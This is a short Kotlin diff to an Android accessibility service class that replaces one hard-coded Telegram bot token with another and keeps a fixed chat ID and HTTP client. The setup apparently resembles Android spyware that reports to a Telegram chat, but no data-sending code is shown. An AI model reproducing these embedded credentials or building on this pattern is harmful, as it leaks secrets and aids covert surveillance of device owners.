@@ -20,7 +20,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     companion object {
         var instance: MyAccessibilityService? = null
-        private val BOT_TOKEN = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
+        private val BOT_TOKEN = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
         private val CHAT_ID = "8820979221"
         private val client = OkHttpClient()
     }
